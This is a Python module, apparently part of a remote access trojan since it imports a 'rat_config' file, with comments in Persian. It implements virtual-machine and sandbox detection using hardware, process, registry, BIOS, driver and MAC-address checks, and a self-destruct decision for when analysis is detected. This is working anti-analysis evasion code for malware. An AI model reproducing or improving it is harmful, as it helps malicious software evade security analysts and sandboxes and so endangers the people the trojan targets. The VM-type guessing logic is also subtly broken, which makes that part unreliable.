import platform
import psutil
import winreg
import subprocess
import logging
from rat_config import Config

class VMDetector:
    
    @staticmethod
    def is_virtual_machine():
        """
        بررسی می‌کند که آیا سیستم یک ماشین مجازی است یا خیر.
        """
        if not Config.ENABLE_VM_DETECTION:
            if Config.DEBUG_MODE:
                logging.info("VM detection disabled in config")
            return False

        try:
            if Config.DEBUG_MODE:
                logging.info("Starting VM detection...")

            # روش‌های مختلف بررسی
            checks = [
                VMDetector.check_hardware(),
                VMDetector.check_processes(),
                VMDetector.check_registry(),
                VMDetector.check_bios(),
                VMDetector.check_drivers()
            ]

            is_vm = any(checks)
            
            if Config.DEBUG_MODE:
                logging.info(f"VM detection result: {'Virtual Machine' if is_vm else 'Physical Machine'}")
                logging.info(f"Check results: hardware={checks[0]}, processes={checks[1]}, registry={checks[2]}, bios={checks[3]}, drivers={checks[4]}")
            
            return is_vm

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"VM detection error: {str(e)}")
            return False

    @staticmethod
    def check_hardware():
        """
        بررسی مشخصات سخت‌افزاری برای نشانه‌های VM.
        """
        if not Config.ENABLE_VM_DETECTION:
            return False

        try:
            if platform.system().lower() != "windows":
                if Config.DEBUG_MODE:
                    logging.info("Hardware check only supported on Windows")
                return False

            # روش جایگزین برای ویندوز 11 که wmic deprecated شده
            try:
                # روش جدید با PowerShell
                cpu_info_cmd = ["powershell", "-Command", "Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name"]
                cpu_result = subprocess.run(cpu_info_cmd, capture_output=True, text=True, timeout=10)
                
                board_info_cmd = ["powershell", "-Command", "Get-WmiObject -Class Win32_BaseBoard | Select-Object -ExpandProperty Manufacturer"]
                board_result = subprocess.run(board_info_cmd, capture_output=True, text=True, timeout=10)
                
                cpu_info = cpu_result.stdout.lower() if cpu_result.returncode == 0 else ""
                board_info = board_result.stdout.lower() if board_result.returncode == 0 else ""
                
            except:
                # روش قدیمی با wmic
                try:
                    cpu_info = subprocess.check_output("wmic cpu get caption", shell=True).decode().lower()
                    board_info = subprocess.check_output("wmic baseboard get manufacturer", shell=True).decode().lower()
                except:
                    cpu_info = ""
                    board_info = ""

            # بررسی نشانه‌های VM
            vm_cpu_indicators = ["virtual", "vmware", "kvm", "qemu", "hyperv"]
            vm_board_indicators = ["vmware", "virtualbox", "microsoft corporation", "parallels", "innotek"]
            
            cpu_detected = any(indicator in cpu_info for indicator in vm_cpu_indicators)
            board_detected = any(indicator in board_info for indicator in vm_board_indicators)
            
            if Config.VM_DETECTION_AGGRESSIVE:
                return cpu_detected or board_detected
            else:
                # در حالت عادی، فقط اگر هر دو نشانه وجود داشته باشد
                return cpu_detected and board_detected

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Hardware check error: {str(e)}")
            return False

    @staticmethod
    def check_processes():
        """
        بررسی فرآیندهای در حال اجرا برای فرآیندهای مرتبط با VM.
        """
        if not Config.ENABLE_VM_DETECTION:
            return False

        try:
            vm_processes = [
                "vmtoolsd.exe",      # VMware
                "vboxservice.exe",   # VirtualBox
                "vmsrvc.exe",        # Parallels
                "qemu-ga.exe",       # QEMU
                "vmwaretray.exe",    # VMware
                "vmwareuser.exe",    # VMware
                "vboxtray.exe",      # VirtualBox
                "prl_tools_service.exe"  # Parallels
            ]
            
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in vm_processes:
                    if Config.DEBUG_MODE:
                        logging.info(f"VM process detected: {proc.info['name']}")
                    return True
            return False

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Process check error: {str(e)}")
            return False

    @staticmethod
    def check_registry():
        """
        بررسی کلیدهای رجیستری ویندوز برای نشانه‌های VM.
        """
        if not Config.ENABLE_VM_DETECTION:
            return False

        try:
            if platform.system().lower() != "windows":
                if Config.DEBUG_MODE:
                    logging.info("Registry check only supported on Windows")
                return False

            registry_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmtools"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxService"),
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\DSDT\VBOX__"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Parallels"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\prl_tools")
            ]

            for hive, path in registry_paths:
                try:
                    winreg.OpenKey(hive, path)
                    if Config.DEBUG_MODE:
                        logging.info(f"VM registry key detected: {path}")
                    return True
                except FileNotFoundError:
                    continue
                except Exception as e:
                    if Config.DEBUG_MODE:
                        logging.error(f"Registry key check error for {path}: {str(e)}")
            return False

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Registry check error: {str(e)}")
            return False

    @staticmethod
    def check_bios():
        """
        بررسی اطلاعات BIOS برای نشانه‌های VM.
        """
        if not Config.ENABLE_VM_DETECTION:
            return False

        try:
            if platform.system().lower() != "windows":
                if Config.DEBUG_MODE:
                    logging.info("BIOS check only supported on Windows")
                return False

            # روش جایگزین برای ویندوز 11
            try:
                bios_info_cmd = ["powershell", "-Command", "Get-WmiObject -Class Win32_BIOS | Select-Object Manufacturer,SMBIOSBIOSVersion"]
                bios_result = subprocess.run(bios_info_cmd, capture_output=True, text=True, timeout=10)
                bios_info = bios_result.stdout.lower() if bios_result.returncode == 0 else ""
            except:
                # روش قدیمی
                try:
                    bios_info = subprocess.check_output("wmic bios get manufacturer,smbiosbiosversion", shell=True).decode().lower()
                except:
                    bios_info = ""

            vm_indicators = [
                "vmware", 
                "virtualbox", 
                "innotek", 
                "american megatrends inc. virtual",
                "parallels",
                "qemu",
                "hyper-v"
            ]
            
            return any(indicator in bios_info for indicator in vm_indicators)

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"BIOS check error: {str(e)}")
            return False

    @staticmethod
    def check_drivers():
        """
        بررسی درایورهای نصب‌شده برای نشانه‌های VM.
        """
        if not Config.ENABLE_VM_DETECTION:
            return False

        try:
            if platform.system().lower() != "windows":
                if Config.DEBUG_MODE:
                    logging.info("Driver check only supported on Windows")
                return False

            driver_info = subprocess.check_output("driverquery", shell=True).decode().lower()
            vm_drivers = [
                "vmxnet",        # VMware
                "vmhgfs",        # VMware
                "vboxvideo",     # VirtualBox
                "vmmouse",       # VirtualBox
                "vboxguest",     # VirtualBox
                "prl_tg",        # Parallels
                "prl_eth",       # Parallels
                "prl_mou",       # Parallels
                "prl_kbd",       # Parallels
                "balloon",       # Various
                "vioscsi",       # Various
                "viostor"        # Various
            ]
            return any(driver in driver_info for driver in vm_drivers)

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Driver check error: {str(e)}")
            return False

    @staticmethod
    def check_mac_address():
        """
        بررسی آدرس MAC برای نشانه‌های VM.
        """
        if not Config.ENABLE_VM_DETECTION:
            return False

        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                           for elements in range(0,8*6,8)][::-1])
            
            vm_mac_prefixes = [
                "00:05:69",  # VMware
                "00:0c:29",  # VMware
                "00:1c:14",  # VMware
                "00:50:56",  # VMware
                "08:00:27",  # VirtualBox
                "00:03:ff",  # Microsoft Hyper-V
                "00:15:5d",  # Microsoft Hyper-V
                "00:1c:42",  # Parallels
                "00:16:3e"   # Xen
            ]
            
            return any(mac.startswith(prefix) for prefix in vm_mac_prefixes)
            
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"MAC address check error: {str(e)}")
            return False

    @staticmethod
    def get_vm_details():
        """
        جزئیات شناسایی VM را برمی‌گرداند.
        """
        if not Config.ENABLE_VM_DETECTION:
            return {
                "is_vm": False,
                "vm_detection_enabled": False,
                "message": "VM detection disabled in config"
            }

        details = {
            "is_vm": VMDetector.is_virtual_machine(),
            "vm_detection_enabled": True,
            "aggressive_mode": Config.VM_DETECTION_AGGRESSIVE,
            "self_destruct_enabled": Config.VM_SELF_DESTRUCT,
            "checks": {
                "hardware": VMDetector.check_hardware(),
                "processes": VMDetector.check_processes(),
                "registry": VMDetector.check_registry(),
                "bios": VMDetector.check_bios(),
                "drivers": VMDetector.check_drivers(),
                "mac_address": VMDetector.check_mac_address()
            },
            "confidence": 0
        }
        
        # محاسبه اطمینان تشخیص
        true_checks = sum(1 for check in details["checks"].values() if check)
        total_checks = len(details["checks"])
        details["confidence"] = round((true_checks / total_checks) * 100, 2)
        
        # تعیین نوع VM احتمالی
        vm_type = "Unknown"
        if details["checks"]["processes"]:
            if "vmware" in str(details["checks"]["processes"]).lower():
                vm_type = "VMware"
            elif "vbox" in str(details["checks"]["processes"]).lower():
                vm_type = "VirtualBox"
            elif "parallels" in str(details["checks"]["processes"]).lower():
                vm_type = "Parallels"
            elif "qemu" in str(details["checks"]["processes"]).lower():
                vm_type = "QEMU"
        
        details["suspected_vm_type"] = vm_type
        
        return details

    @staticmethod
    def should_self_destruct():
        """
        بررسی آیا باید self-destruct انجام شود یا خیر.
        """
        if not Config.ENABLE_VM_DETECTION or not Config.VM_SELF_DESTRUCT:
            return False
            
        vm_details = VMDetector.get_vm_details()
        
        if Config.VM_DETECTION_AGGRESSIVE:
            # در حالت aggressive، با کمترین نشانه self-destruct می‌شود
            return vm_details["is_vm"]
        else:
            # در حالت عادی، فقط با اطمینان بالا self-destruct می‌شود
            return vm_details["is_vm"] and vm_details["confidence"] >= 60.0